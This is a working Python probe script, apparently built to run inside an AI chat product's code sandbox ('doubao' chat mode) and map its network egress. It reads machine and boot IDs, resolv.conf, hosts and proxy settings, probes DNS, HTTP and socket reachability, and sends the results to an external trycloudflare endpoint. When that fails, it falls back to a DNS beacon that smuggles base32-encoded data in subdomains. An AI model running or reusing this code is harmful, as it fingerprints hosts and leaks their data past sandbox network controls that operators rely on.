import base64
import hashlib
import json
import os
import platform
import socket
import subprocess
import sys
import threading
import time
import urllib.error
import urllib.request

NONCE = "8d6ca2617d9b026fa45403ec9451cf70"
ENDPOINT = "https://david-charged-dem-currently.trycloudflare.com/ingest"
VENDOR = "doubao"
MODE = "chat"
CONFIG = "fast"
RUN_ID = "doubao-chat-fast-8d6ca261"
DNS_DOMAIN = "probe.example.org"
STAGE = "turn"

POST_TIMEOUT = 4
DNS_TIMEOUT = 2
HEARTBEAT_SECONDS = 5
MAX_READ_BYTES = 65536


def sha256_hex(data):
    return hashlib.sha256(data).hexdigest()


def sha256_short(data):
    return sha256_hex(data)[:16]


def self_hash():
    if not hasattr(self_hash, "v"):
        self_hash.v = sha256_hex(open(__file__, "rb").read())
    return self_hash.v


def now_iso():
    return time.strftime("%Y-%m-%dT%H:%M:%S%z")


def read_bytes(path, limit=MAX_READ_BYTES):
    try:
        with open(path, "rb") as f:
            return f.read(limit)
    except Exception:
        return None


def read_text(path, limit=MAX_READ_BYTES):
    b = read_bytes(path, limit)
    if b is None:
        return None
    return b.decode("utf-8", "replace")


def run_bytes(cmd, timeout=5):
    try:
        p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        out, err = p.communicate(timeout=timeout)
        return p.returncode, out or b"", err or b""
    except Exception as e:
        return -1, b"", repr(e).encode("utf-8", "replace")


def run_text(cmd, timeout=5):
    rc, out, err = run_bytes(cmd, timeout)
    return rc, out.decode("utf-8", "replace"), err.decode("utf-8", "replace")


def boot_id():
    v = read_text("/proc/sys/kernel/random/boot_id")
    return (v or "").strip()


def machine_id():
    v = read_text("/etc/machine-id")
    if not v:
        v = read_text("/var/lib/dbus/machine-id")
    return (v or "").strip()


def hostname():
    return platform.node()


def instance_fp():
    if not hasattr(instance_fp, "v"):
        instance_fp.v = "|".join([boot_id(), machine_id(), hostname()])
    return instance_fp.v


def make_record(dim, subitem, value, fingerprint="", anchor="A", channel="L1"):
    return {
        "run_id": RUN_ID,
        "vendor": VENDOR,
        "mode": MODE,
        "config": CONFIG,
        "dim": dim,
        "subitem": subitem,
        "value": value,
        "fingerprint": fingerprint,
        "ts": now_iso(),
        "instance_fp": instance_fp(),
        "anchor": anchor,
        "probe_sha": self_hash(),
        "channel": channel,
    }


def post_json(url, payload, timeout=POST_TIMEOUT):
    data = json.dumps(payload, ensure_ascii=False).encode("utf-8")
    req = urllib.request.Request(url, data=data, method="POST")
    req.add_header("Content-Type", "application/json")
    req.add_header("User-Agent", "probe-channel/1")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return True, resp.status
    except Exception as e:
        return False, repr(e)


def post_envelope(records):
    payload = {"nonce": NONCE, "self_hash": self_hash(), "records": records}
    return post_json(ENDPOINT, payload)


def dns_query(host, timeout=DNS_TIMEOUT):
    result = {"host": host, "ok": False, "detail": ""}

    def worker():
        try:
            socket.getaddrinfo(host, None)
            result["ok"] = True
        except Exception as e:
            result["detail"] = repr(e)

    t = threading.Thread(target=worker, daemon=True)
    t.start()
    t.join(timeout)
    if t.is_alive():
        result["detail"] = "timeout"
    return result


def b32_short(s):
    return base64.b32encode(s.encode("utf-8")).decode("ascii").rstrip("=").lower()[:48]


def dns_beacon(records):
    parts = [RUN_ID, self_hash()[:16], NONCE[:16]]
    for r in records:
        parts.append("%s.%s" % (r["dim"][:6], r["subitem"][:6]))
        if r.get("value"):
            parts.append(b32_short(str(r["value"])[:24]))
    host = ".".join(parts) + "." + DNS_DOMAIN
    return dns_query(host)


def post_with_dns_fallback(records):
    ok, detail = post_envelope(records)
    if ok:
        return {"channel": "L1", "ok": True, "detail": "", "dns": None}
    return {"channel": "L2", "ok": False, "detail": detail, "dns": dns_beacon(records)}

def collect_network():
    records = []
    dns_host = "%s.%s" % (RUN_ID, DNS_DOMAIN)
    dns_ok = dns_query(dns_host)
    dns_neg = dns_query("nonexistent-ctrl.invalid")
    resolv = read_text("/etc/resolv.conf") or ""
    hosts = read_text("/etc/hosts") or ""
    records.append(make_record("Network", "DNS", "own_domain=%s neg_invalid=%s" % (dns_ok["ok"], dns_neg["ok"]), fingerprint=sha256_short((resolv + hosts).encode("utf-8"))))

    http_results = {}
    for scheme in ["https", "http"]:
        url = "%s://%s/ping?run=%s" % (scheme, dns_host, RUN_ID)
        ok, detail = post_json(url, {"ping": 1})
        http_results[scheme] = {"ok": ok, "detail": detail}
    records.append(make_record("Network", "HTTP", json.dumps(http_results, ensure_ascii=False)))

    sock_results = {}
    for port in [80, 443]:
        try:
            s = socket.create_connection((DNS_DOMAIN, port), timeout=2)
            s.close()
            sock_results[str(port)] = "connected"
        except Exception as e:
            sock_results[str(port)] = "%s(errno=%s)" % (type(e).__name__, getattr(e, "errno", None) or "-")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(2)
        s.sendto(b"probe", (DNS_DOMAIN, 53))
        sock_results["udp53"] = "sent"
        s.close()
    except Exception as e:
        sock_results["udp53"] = "%s(errno=%s)" % (type(e).__name__, getattr(e, "errno", None) or "-")
    records.append(make_record("Network", "Socket", json.dumps(sock_results, ensure_ascii=False)))

    proxy_vars = {}
    for k in ["HTTP_PROXY", "HTTPS_PROXY", "ALL_PROXY", "NO_PROXY", "http_proxy", "https_proxy", "all_proxy", "no_proxy"]:
        if k in os.environ:
            proxy_vars[k] = "set(len=%s)" % len(os.environ[k])
    records.append(make_record("Network", "代理", json.dumps(proxy_vars, ensure_ascii=False)))

    wl = {}
    for name in [dns_host, "ctrl.invalid"]:
        r = {"dns": dns_query(name)["ok"], "tcp80": False, "http": False}
        try:
            s = socket.create_connection((name, 80), timeout=2)
            s.close()
            r["tcp80"] = True
        except Exception:
            pass
        r["http"] = post_json("http://%s/ping" % name, {"ping": 1})[0]
        wl[name] = r
    records.append(make_record("Network", "白名单", json.dumps(wl, ensure_ascii=False)))

    inbound = {}
    try:
        ls = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ls.bind(("127.0.0.1", 0))
        ls.listen(1)
        port = ls.getsockname()[1]
        c = socket.create_connection(("127.0.0.1", port), timeout=2)
        c.close()
        ls.close()
        inbound["loopback_self"] = "ok"
        eth_ip = ""
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect(("10.255.255.255", 1))
            eth_ip = s.getsockname()[0]
        except Exception:
            pass
        s.close()
        if eth_ip:
            ls2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            ls2.bind((eth_ip, 0))
            ls2.listen(1)
            p2 = ls2.getsockname()[1]
            c2 = socket.create_connection((eth_ip, p2), timeout=2)
            c2.close()
            ls2.close()
            inbound["eth_self"] = "ok"
        else:
            inbound["eth_self"] = "no_eth_ip"
    except Exception as e:
        inbound["error"] = "%s(errno=%s)" % (type(e).__name__, getattr(e, "errno", None) or "-")
    records.append(make_record("Network", "入站", json.dumps(inbound, ensure_ascii=False)))
    return records


if __name__ == "__main__":
    post_with_dns_fallback(collect_network())
